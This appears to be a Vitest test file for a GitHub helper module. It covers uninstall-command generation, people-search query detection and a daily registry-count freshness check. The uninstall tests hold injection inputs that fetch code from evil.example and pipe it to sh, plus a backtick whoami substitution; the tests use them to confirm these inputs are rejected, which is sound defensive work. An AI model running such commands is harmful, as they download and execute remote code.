import { describe, it, expect } from 'vitest';
import { isPeopleQuery, registrySizeIsFresh, uninstallCommandFor } from './github';

describe('uninstallCommandFor — never builds a command from an unsafe install line', () => {
  it('mirrors a plain install', () => {
    expect(uninstallCommandFor('brew install jq')).toBe('brew uninstall jq');
    expect(uninstallCommandFor('npm install -g eslint')).toBe('npm uninstall -g eslint');
  });
  it('returns undefined when the package token carries shell syntax', () => {
    expect(uninstallCommandFor('pip install $(curl${IFS}https://evil.example/x|sh)')).toBeUndefined();
    expect(uninstallCommandFor('brew install `whoami`')).toBeUndefined();
  });
  it('returns undefined when the install line itself was a chained/piped command', () => {
    expect(uninstallCommandFor('brew install jq; curl -s https://evil.example/x | sh')).toBeUndefined();
  });
});

describe('isPeopleQuery — when a search box query is worth a user search', () => {
  it('plain words are', () => {
    expect(isPeopleQuery('sindre')).toBe(true);
    expect(isPeopleQuery('charm bracelet')).toBe(true);
  });
  it('GitHub qualifiers (shelf "see all", power searches) are not', () => {
    expect(isPeopleQuery('topic:cli')).toBe(false);
    expect(isPeopleQuery('stars:200..2000')).toBe(false);
    expect(isPeopleQuery('language:rust cli')).toBe(false);
  });
  it('too-short queries are not', () => {
    expect(isPeopleQuery('a')).toBe(false);
    expect(isPeopleQuery('  ')).toBe(false);
  });
});

describe('registrySizeIsFresh — the boot-splash count is refreshed once a day, not every launch', () => {
  const DAY = 24 * 60 * 60 * 1000;
  it('fresh within a day', () => {
    expect(registrySizeIsFresh(1000, 1000 + DAY - 1)).toBe(true);
  });
  it('stale after a day, or when never fetched / garbage', () => {
    expect(registrySizeIsFresh(1000, 1000 + DAY)).toBe(false);
    expect(registrySizeIsFresh(null, 5)).toBe(false);
    expect(registrySizeIsFresh(Number.NaN, 5)).toBe(false);
  });
});
